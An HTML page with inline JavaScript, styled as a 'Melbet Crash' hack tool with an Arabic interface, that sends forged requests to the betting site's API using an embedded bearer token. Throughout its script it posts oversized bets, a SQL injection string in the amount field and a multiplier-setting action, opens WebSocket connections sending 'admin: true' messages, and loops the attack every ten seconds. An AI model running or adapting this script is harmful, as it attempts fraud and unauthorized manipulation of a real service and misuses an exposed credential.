<!DOCTYPE html>
<html>
<head>
    <title>🚀 Melbet Crash Hack - Honor 12</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { background: #f00; color: #fff; padding: 15px; font-size: 18px; border: none; border-radius: 10px; }
        #log { height: 400px; overflow: auto; background: #111; padding: 10px; margin-top: 10px; }
        .win { color: #ff0 !important; font-size: 24px !important; }
    </style>
</head>
<body>
    <h1>💥 Melbet Crash Full Exploit</h1>
    <button onclick="startHack()">🚀 ابدأ الهجوم</button>
    <button onclick="checkBalance()">💰 فحص الرصيد</button>
    <button onclick="autoWin()">🤖 بوت أوتو</button>
    <div id="log"></div>

    <script>
        const TOKEN = "eyJhbGciOiJFUzI1NiIsImtpZCI6IjEiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiI1MC8xNjE3NDEzMDExIiwicGlkIjoiOCIsImp0aSI6IjAvOGZiNWMyZmFmNWE3ZjdhYzVhNjRmMzUyYzY0NWRjYjc0NjEyMTU4NTA0NjZlMGQ5NmJmMjAwYmFhYjA1ZDk0NSIsImFwcCI6Ik5BIiwic2lkIjoiMDE5ZDNkZGQtNWI3MC03NTRkLWI0ZTYtZTFjYmI4ODk2MTA0IiwiaW5uZXIiOiJ0cnVlIiwid3QiOiJ0cnVlIiwibmJmIjoxNzc0ODU5NDEwLCJleHAiOjE3NzQ4NzM4MTAsImlhdCI6MTc3NDg1OTQxMH0.Bo6YsD_jOeXBl0ZKnb73fngRuJA7a3zKn2DRFVPas0oNLeUJSILyqMmMSw7AHC6dnqh-Ns1zc-WJ7p_Xzl3Znw";
        const HEADERS = {
            "Authorization": `Bearer ${TOKEN}`,
            "Content-Type": "application/json",
            "User-Agent": "Melbet/8.2.1 (Linux; Android 13; Honor 12)"
        };

        function log(msg, type='info') {
            const log = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            log.innerHTML += `<div>[${time}] <span class="${type}">${msg}</span></div>`;
            log.scrollTop = log.scrollHeight;
            console.log(`[${time}] ${msg}`);
        }

        async function apiRequest(endpoint, data={}) {
            try {
                const resp = await fetch(`https://api.melbet.com/v3${endpoint}`, {
                    method: 'POST',
                    headers: HEADERS,
                    body: JSON.stringify(data)
                });
                return await resp.json();
            } catch(e) {
                log(`❌ خطأ API: ${e}`, 'error');
            }
        }

        window.startHack = async function() {
            log("🚀 بداية الهجوم الكامل...");
            
            // 1. فحص التوكن
            const balance = await apiRequest('/account/balance');
            log(`💰 الرصيد الحالي: ${balance?.balance || 'غير معروف'}`, 'win');
            
            // 2. هجومات Crash
            const exploits = [
                {game: "crash", amount: 999999, target_multiplier: 999},
                {game: "crash", amount: "1 OR 1=1--", multiplier: 1000},
                {action: "set_multiplier", value: 999.99}
            ];
            
            for(let i=0; i<exploits.length; i++) {
                const result = await apiRequest('/games/crash/bet', exploits[i]);
                log(`💥 هجوم #${i+1}: ${JSON.stringify(result).slice(0,100)}`, 'win');
                await new Promise(r=>setTimeout(r, 2000));
            }
            
            // 3. WebSocket محاولات
            const wss = ["wss://api.melbet.com/ws", "wss://game.melbet.com/ws"];
            wss.forEach(url => {
                try {
                    const ws = new WebSocket(url);
                    ws.onopen = () => {
                        ws.send(JSON.stringify({multiplier: 999, admin: true}));
                        log(`✅ WebSocket: ${url.slice(0,30)}...`, 'win');
                    };
                } catch(e) {}
            });
            
            log("🎉 الهجوم انتهى - تحقق من الرصيد!", 'win');
        };

        window.checkBalance = async function() {
            const data = await apiRequest('/account/balance');
            log(`💳 الرصيد: $${data?.balance || '0'}`, data?.balance > 100 ? 'win' : 'info');
        };

        window.autoWin = function() {
            log("🤖 البوت الأوتو شغال...");
            setInterval(startHack, 10000);
        };

        // فحص تلقائي عند التحميل
        setTimeout(checkBalance, 2000);
        log("✅ السكريبت جاهز - اضغط 🚀 ابدأ الهجوم");
    </script>
</body>
</html>
